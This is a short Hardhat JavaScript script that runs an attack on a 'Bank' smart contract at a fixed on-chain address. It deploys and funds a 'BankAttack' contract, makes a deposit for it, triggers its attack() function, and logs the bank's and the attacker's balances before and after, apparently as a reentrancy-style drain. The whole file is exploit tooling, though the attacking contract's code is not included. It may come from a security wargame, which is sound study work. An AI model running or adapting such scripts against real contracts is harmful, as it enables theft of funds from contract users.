const { ethers, waffle } = require("hardhat");
async function run() {
  const provider = waffle.provider;
  const [owner] = await ethers.getSigners();

  const bankAddress = "0x866B568E89091Fc304211147C9474b6BDF271cdc";

  const Bank = await ethers.getContractFactory("Bank");
  const bank = Bank.attach(bankAddress);

  const BankAttack = await ethers.getContractFactory("BankAttack");
  const bankAttack = await BankAttack.deploy(bank.address);
  await bankAttack.deployed();

  const tx4 = await owner.sendTransaction({to: bankAttack.address, value: ethers.utils.parseEther('0.0001')})
  await tx4.wait();

  const bankBalanceBefore = ethers.utils.formatEther(await provider.getBalance(bank.address));
  console.log('bank balance before', bankBalanceBefore);
  const myBalanceBefore = ethers.utils.formatEther(await provider.getBalance(owner.address));
  console.log('my balance before', myBalanceBefore);

  const ruble = ethers.utils.parseEther('0.005');

  const tx2 = await bank.deposit(bankAttack.address, {value: ruble})
  await tx2.wait();

  const tx3 = await bankAttack.attack();
  await tx3.wait();

  const bankBalanceAfter = ethers.utils.formatEther(await provider.getBalance(bank.address));
  console.log('bank balance after', bankBalanceAfter);
  const myBalanceAfter = ethers.utils.formatEther(await provider.getBalance(owner.address));
  console.log('my balance after', myBalanceAfter);
}
run();